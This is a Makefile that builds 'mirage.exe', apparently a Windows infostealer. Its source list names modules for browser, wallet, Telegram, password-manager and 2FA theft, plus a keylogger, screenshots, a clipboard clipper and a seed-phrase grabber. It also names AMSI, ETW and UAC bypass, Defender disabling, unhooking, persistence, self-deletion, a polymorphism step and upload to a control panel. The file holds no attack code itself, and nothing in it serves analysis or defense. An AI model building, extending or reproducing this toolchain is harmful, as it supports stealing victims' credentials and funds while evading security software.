CC = x86_64-w64-mingw32-gcc
NASM = nasm
CFLAGS = -Wall -Wextra -Wno-error -O2 -flto -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
LDFLAGS = -flto -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows

SRCS = src/main.c \
       src/rt/rt_startup.c \
       src/rt/rt_mem.c \
       src/rt/rt_str.c \
       src/rt/rt_conv.c \
       src/rt/rt_snprintf.c \
       src/config_rt.c \
       src/rt/rt_file.c \
       src/types/peb.c \
       src/types/hash.c \
       src/types/export_resolve.c \
       src/syscalls/engine.c \
       src/browsers/chromium.c \
       src/browsers/firefox.c \
       src/browsers/browser_paths.c \
       src/wallets/wallets.c \
       src/wallets/wallet_ext.c \
       src/wallets/wallet_desktop.c \
       src/messengers/messengers.c \
       src/messengers/telegram_tdata.c \
       src/messengers/telegram_web.c \
       src/parsers/sqlite.c \
       src/network/socks5.c \
       src/network/panel_http.c \
       src/network/ws2.c \
       src/network/ws2_peb.c \
       src/network/proxy.c \
       src/network/chunked.c \
       src/network/schannel.c \
       src/system/system_info.c \
       src/system/clipboard.c \
       src/system/wifi.c \
       src/system/keylogger.c \
       src/system/screenshot.c \
       src/system/seed_grabber.c \
       src/system/grabber.c \
       src/system/inject.c \
       src/system/twofa.c \
       src/system/clipper.c \
       src/system/passman.c \
       src/system/gaming.c \
       src/system/vpn.c \
       src/system/loader_stomp.c \
       src/crypto/chrome_crypto.c \
       src/crypto/firefox_crypto.c \
       src/crypto/chacha_poly.c \
       src/crypto/archive_crypt.c \
       src/crypto/dpapi.c \
       src/crypto/chrome_key.c \
       src/crypto/appbound.c \
       src/crypto/elevator.c \
       src/crypto/bcrypt_peb.c \
       src/crypto/com_peb.c \
       src/crypto/crypt32_peb.c \
       src/browsers/cdp_grabber.c \
       src/utils/base64.c \
       src/utils/file_utils.c \
       src/utils/secure_zero.c \
       src/utils/lz4.c \
       src/evasion/anti_analysis.c \
       src/evasion/detection.c \
       src/evasion/evasion.c \
       src/evasion/amsi_bypass.c \
       src/evasion/etw_bypass.c \
       src/evasion/uac_bypass.c \
       src/evasion/peb_hide.c \
       src/evasion/defender_disable.c \
       src/evasion/stack_spoof.c \
       src/evasion/mutex.c \
       src/evasion/unhook.c \
       src/evasion/sleep_obfusc.c \
       src/cleanup/persistence.c \
       src/cleanup/self_delete.c
ASM_SRCS = asm/mirage_stubs_v2.asm asm/stack_spoof_stubs.asm


OBJ_DIR = build
OBJS = $(patsubst src/%.c, $(OBJ_DIR)/%.o, $(SRCS)) \
       $(patsubst asm/%.asm, $(OBJ_DIR)/asm/%.o, $(ASM_SRCS))
TARGET = mirage.exe

.PHONY: all clean test polymorph

all: $(TARGET)

polymorph:
	go run ./panel/cmd/polymorph .

test: $(TARGET)
	./$(TARGET) --test

$(TARGET): $(OBJS)
	$(CC) -o $@ $(OBJS) $(LDFLAGS)
	strip --strip-all $@

$(OBJ_DIR)/%.o: src/%.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/asm/%.o: asm/%.asm
	@mkdir -p $(dir $@)
	$(NASM) -f win64 $< -o $@

clean:
	rm -rf $(OBJ_DIR) $(TARGET)

test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_hash tests/test_hash.c src/types/hash.c
	./tests/test_hash

# ── Unit tests (native gcc for Linux) ─────────────────────────
TEST_CC = gcc
TEST_CFLAGS = -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/utils -std=c11

test-unit: test-crypto test-peb test-sqlite test-chromium test-wallets test-messengers test-network test-evasion
	@echo "=== ALL UNIT TESTS PASSED ==="

test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c src/utils/secure_zero.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_crypto tests/test_crypto.c src/crypto/chacha_poly.c src/utils/secure_zero.c
	./tests/test_crypto

test-sqlite: tests/test_sqlite.c src/parsers/sqlite.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_sqlite tests/test_sqlite.c src/parsers/sqlite.c
	./tests/test_sqlite

test-peb: tests/test_peb.c src/types/hash.c src/types/peb.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -o tests/test_peb tests/test_peb.c src/types/hash.c src/types/peb.c
	./tests/test_peb

test-chromium: tests/test_chromium.c tests/peb_stub.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
	$(TEST_CC) $(TEST_CFLAGS) -O0 -DZIALFI_TEST_MODE -o tests/test_chromium tests/test_chromium.c tests/peb_stub.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
	./tests/test_chromium

test-wallets: tests/test_wallets.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_wallets tests/test_wallets.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
	./tests/test_wallets

test-messengers: tests/test_messengers.c src/messengers/messengers.c
	$(TEST_CC) $(TEST_CFLAGS) -DTEST_MESSENGERS_STANDALONE -o tests/test_messengers tests/test_messengers.c src/messengers/messengers.c
	./tests/test_messengers

test-network: tests/test_network.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_network tests/test_network.c
	./tests/test_network

test-evasion: tests/test_evasion.c src/evasion/detection.c src/types/hash.c
	$(TEST_CC) $(TEST_CFLAGS) -DTEST_EVASION_STANDALONE -o tests/test_evasion tests/test_evasion.c src/evasion/detection.c src/types/hash.c
	./tests/test_evasion

clean-tests:
	rm -f tests/test_crypto tests/test_sqlite tests/test_peb tests/test_chromium \
	      tests/test_wallets tests/test_messengers tests/test_network tests/test_evasion \
	      tests/test_lz4 tests/test_chunked tests/test_rt tests/test_seed_grabber \
	      tests/test_scoring tests/test_asn1 tests/test_base64 tests/test_json_extract \
	      tests/*.o tests/*.gcda tests/*.gcno

# ── Orphan test targets ──────────────────────────────────────
test-lz4: tests/test_lz4.c src/utils/lz4.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_lz4 tests/test_lz4.c src/utils/lz4.c
	./tests/test_lz4

test-chunked: tests/test_chunked.c src/network/chunked.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Wno-error -Wno-cpp -Iinclude -Isrc -Isrc/network -Isrc/types -Isrc/utils -Isrc/parsers -std=c11 -o tests/test_chunked.exe tests/test_chunked.c src/network/chunked.c src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c -lws2_32 -ladvapi32
	tests/test_chunked.exe

test-rt: tests/test_rt.c src/rt/rt_str.c src/rt/rt_mem.c src/rt/rt_conv.c src/rt/rt_snprintf.c
	$(TEST_CC) $(TEST_CFLAGS) -Wno-error -Wl,--allow-multiple-definition -Isrc/rt -o tests/test_rt tests/test_rt.c src/rt/rt_str.c src/rt/rt_mem.c src/rt/rt_conv.c src/rt/rt_snprintf.c
	./tests/test_rt

test-scoring: tests/test_scoring.c src/evasion/anti_analysis.c src/types/hash.c
	$(TEST_CC) $(TEST_CFLAGS) -DTEST_SCORING_STANDALONE -o tests/test_scoring tests/test_scoring.c src/evasion/anti_analysis.c src/types/hash.c
	./tests/test_scoring

test-seed-grabber: tests/test_seed_grabber.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_seed_grabber tests/test_seed_grabber.c
	./tests/test_seed_grabber

test-asn1: tests/test_asn1.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_asn1 tests/test_asn1.c
	./tests/test_asn1

test-base64: tests/test_base64.c src/utils/base64.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_base64 tests/test_base64.c src/utils/base64.c
	./tests/test_base64

test-chrome-crypto: tests/test_chrome_crypto.c
	$(TEST_CC) $(TEST_CFLAGS) -Isrc -o tests/test_chrome_crypto tests/test_chrome_crypto.c src/utils/base64.c -lssl -lcrypto
	./tests/test_chrome_crypto

test-firefox-crypto: tests/test_firefox_crypto.c
	$(TEST_CC) $(TEST_CFLAGS) -Isrc -o tests/test_firefox_crypto tests/test_firefox_crypto.c src/utils/secure_zero.c -lssl -lcrypto
	./tests/test_firefox_crypto

test-archive-crypt: tests/test_archive_crypt.c
	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/crypto -o tests/test_archive_crypt tests/test_archive_crypt.c src/crypto/chacha_poly.c src/utils/secure_zero.c -lssl -lcrypto
	./tests/test_archive_crypt

# C→Go interop fixture: encrypts a fixed pattern with the client's
# archive_encrypt (PBKDF2-SHA256 seed + RFC 8439 AEAD) into
# panel/testdata/archive_sample.bin; the Go test TestDecryptArchive_CSamples
# must decrypt it with x/crypto chacha20poly1305. Regenerate after every
# MIRAGE_SEED change.
test-interop-gen: tests/test_interop_gen.c src/crypto/archive_crypt.c src/crypto/chacha_poly.c src/crypto/monocypher.c
	@mkdir -p panel/testdata
	$(TEST_CC) $(TEST_CFLAGS) -Iinclude -Isrc -Isrc/crypto -Isrc/utils -Isrc/types -o tests/test_interop_gen tests/test_interop_gen.c src/crypto/archive_crypt.c src/crypto/chacha_poly.c src/crypto/monocypher.c src/utils/secure_zero.c -lssl -lcrypto
	./tests/test_interop_gen

test-json-extract: tests/test_json_extract.c
	$(TEST_CC) $(TEST_CFLAGS) -DTEST_JSON_EXTRACT_STANDALONE -o tests/test_json_extract tests/test_json_extract.c
	./tests/test_json_extract


# Phase 38 test targets
test-network-mock: tests/test_network_mock.c src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Isrc -Isrc/network -Isrc/crypto -Isrc/types -o tests/test_network_mock tests/test_network_mock.c src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c -lws2_32
	tests/test_network_mock

test-crypto-mock: tests/test_crypto_mock.c src/crypto/bcrypt_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c src/utils/base64.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Isrc -Isrc/crypto -Isrc/types -o tests/test_crypto_mock tests/test_crypto_mock.c src/crypto/bcrypt_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c src/utils/base64.c -lbcrypt
	tests/test_crypto_mock

test-mock-seams: tests/test_mock_seams.c src/crypto/bcrypt_peb.c src/crypto/crypt32_peb.c src/crypto/com_peb.c src/network/ws2_peb.c src/types/peb.c src/types/hash.c src/types/export_resolve.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Isrc -Isrc/network -Isrc/crypto -Isrc/types -o tests/test_mock_seams tests/test_mock_seams.c src/crypto/bcrypt_peb.c src/crypto/crypt32_peb.c src/crypto/com_peb.c src/network/ws2_peb.c src/types/peb.c src/types/hash.c src/types/export_resolve.c -lbcrypt -lole32 -lws2_32
	tests/test_mock_seams

test-fixtures: tests/test_fixtures.c src/parsers/sqlite.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_fixtures tests/test_fixtures.c src/parsers/sqlite.c
	tests/test_fixtures

test-sqlite-fault: tests/test_sqlite_fault.c src/parsers/sqlite.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_sqlite_fault tests/test_sqlite_fault.c src/parsers/sqlite.c
	tests/test_sqlite_fault

# ── Core type tests ──────────────────────────────────────────
test-export-resolve: tests/test_export_resolve.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -o tests/test_export_resolve tests/test_export_resolve.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
	./tests/test_export_resolve

test-file-utils: tests/test_file_utils.c src/utils/file_utils.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Isrc/utils -o tests/test_file_utils tests/test_file_utils.c src/utils/file_utils.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
	./tests/test_file_utils

# ── Aggregate target ─────────────────────────────────────────
test-all: test-hash test-crypto test-sqlite test-peb test-chromium test-wallets \
          test-messengers test-network test-evasion test-lz4 \
          test-rt test-scoring test-asn1 test-base64 \
          test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock test-clipper test-wifi test-keylogger test-gaming test-twofa test-vpn \
          test-export-resolve test-file-utils test-ws2 test-socks5 test-proxy test-panel-http test-schannel \
          test-chrome-crypto test-firefox-crypto test-archive-crypt test-chunked test-json-extract test-seed-grabber
	@echo "=== ALL TEST SUITES PASSED ==="

# ── Coverage ─────────────────────────────────────────────────
COVERAGE_CFLAGS = --coverage -fprofile-arcs -ftest-coverage
COVERAGE_LDFLAGS = --coverage

test-coverage: clean-tests
	$(MAKE) test-all TEST_CC="$(TEST_CC)" TEST_CFLAGS="$(TEST_CFLAGS) $(COVERAGE_CFLAGS)"
	@echo "Coverage data collected. Run: lcov --capture --directory . --output-file coverage.info && genhtml coverage.info -o coverage-html"

test-e2e: tests/test_e2e.c
	$(CC) -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -o tests/test_e2e tests/test_e2e.c src/network/panel_http.c src/browsers/browser_paths.c src/browsers/chromium.c src/browsers/firefox.c src/wallets/wallets.c src/wallets/wallet_ext.c src/wallets/wallet_desktop.c src/messengers/messengers.c src/parsers/sqlite.c src/system/system_info.c src/system/wifi.c src/system/twofa.c src/crypto/chrome_crypto.c src/crypto/firefox_crypto.c src/crypto/chacha_poly.c src/crypto/archive_crypt.c src/crypto/dpapi.c src/crypto/chrome_key.c src/crypto/appbound.c src/evasion/anti_analysis.c src/evasion/detection.c src/evasion/evasion.c src/evasion/amsi_bypass.c src/evasion/etw_bypass.c src/evasion/uac_bypass.c src/evasion/peb_hide.c src/evasion/defender_disable.c src/evasion/mutex.c src/cleanup/persistence.c src/cleanup/self_delete.c src/cleanup/temp_wipe.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/syscalls/engine.c src/network/ws2.c src/network/proxy.c src/network/chunked.c src/network/schannel.c asm/mirage_stubs_v2.o -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32

# ── System module tests ────────────────────────────────────
test-clipper: tests/test_clipper.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_clipper tests/test_clipper.c
	./tests/test_clipper

test-wifi: tests/test_wifi.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_wifi tests/test_wifi.c
	./tests/test_wifi

test-keylogger: tests/test_keylogger.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_keylogger tests/test_keylogger.c
	./tests/test_keylogger

test-gaming: tests/test_gaming.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_gaming tests/test_gaming.c
	./tests/test_gaming

test-twofa: tests/test_twofa.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_twofa tests/test_twofa.c
	./tests/test_twofa

test-vpn: tests/test_vpn.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_vpn tests/test_vpn.c
	./tests/test_vpn

# ── Network module unit tests ────────────────────────────────
NET_MOCK_DEPS = src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c
NET_MOCK_FLAGS = -DZIALFI_TEST_MODE -Wno-error -Wno-cpp -Isrc -Isrc/network -Isrc/types -Isrc/utils -Isrc/parsers

test-ws2: tests/test_ws2.c $(NET_MOCK_DEPS)
	$(TEST_CC) $(TEST_CFLAGS) $(NET_MOCK_FLAGS) -o tests/test_ws2.exe tests/test_ws2.c $(NET_MOCK_DEPS) -lws2_32
	tests/test_ws2.exe

test-socks5: tests/test_socks5.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_socks5.exe tests/test_socks5.c
	tests/test_socks5.exe

test-proxy: tests/test_proxy.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_proxy.exe tests/test_proxy.c
	tests/test_proxy.exe

test-panel-http: tests/test_panel_http.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_panel_http.exe tests/test_panel_http.c
	tests/test_panel_http.exe

test-schannel: tests/test_schannel.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_schannel.exe tests/test_schannel.c
	tests/test_schannel.exe

test-network-unit: test-ws2 test-socks5 test-proxy test-panel-http test-schannel test-network test-network-mock
	@echo "=== ALL NETWORK TESTS PASSED ==="
